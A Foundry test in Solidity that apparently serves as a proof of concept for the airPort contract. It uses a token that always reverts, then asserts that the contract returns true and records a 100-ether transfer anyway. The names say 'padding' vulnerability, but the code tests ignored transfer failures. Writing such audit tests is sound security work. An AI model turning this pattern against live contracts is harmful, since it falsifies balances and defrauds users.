// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract MaliciousToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        revert("Transfer always fails");
    }
}

contract PaddingVulnerabilityTest is Test {
    airPort public port;
    MaliciousToken public token;
    address victim = address(0x11);
    address attacker = address(0x22);

    function setUp() public {
        port = new airPort();
        token = new MaliciousToken();
    }

    function test_MessagePaddingVulnerability() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 totalTransfersBefore = port.totalTransfers(victim);
        uint256 userTokenTransferBefore = port.userTokenTransfers(victim, address(token));
        console.log("Initial totalTransfers:", totalTransfersBefore);
        console.log("Initial userTokenTransfers:", userTokenTransferBefore);
        
        console.log("--- Trigger Transfer ---");
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        bool result = port.transfer(
            victim,
            address(token),
            recipients,
            100 ether
        );
        
        console.log("--- AFTER-Trigger State ---");
        uint256 totalTransfersAfter = port.totalTransfers(victim);
        uint256 userTokenTransferAfter = port.userTokenTransfers(victim, address(token));
        console.log("Final totalTransfers:", totalTransfersAfter);
        console.log("Final userTokenTransfers:", userTokenTransferAfter);
        
        // Compute state changes
        uint256 totalTransfersChange = totalTransfersAfter - totalTransfersBefore;
        uint256 userTokenTransferChange = userTokenTransferAfter - userTokenTransferBefore;
        console.log("TotalTransfers Change:", totalTransfersChange);
        console.log("userTokenTransfers Change:", userTokenTransferChange);
        
        // Vulnerability verdict based on state changes
        bool vulnerabilityExists = (totalTransfersChange > 0) && 
                                  (userTokenTransferChange == 100 ether);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: State updated despite token transfer failure");
        } else {
            console.log("Vulnerability not Exist: State remains unchanged after failed transfer");
        }

        // Original assertions
        assertTrue(result, "Function should return true despite token transfer failure");
        uint256 totalTransfers = port.totalTransfers(victim);
        uint256 userTokenTransfer = port.userTokenTransfers(victim, address(token));
        assertEq(totalTransfers, 1, "Total transfers should increment despite failed token transfer");
        assertEq(userTokenTransfer, 100 ether, "Token transfer state should update despite failed transfer");
    }
}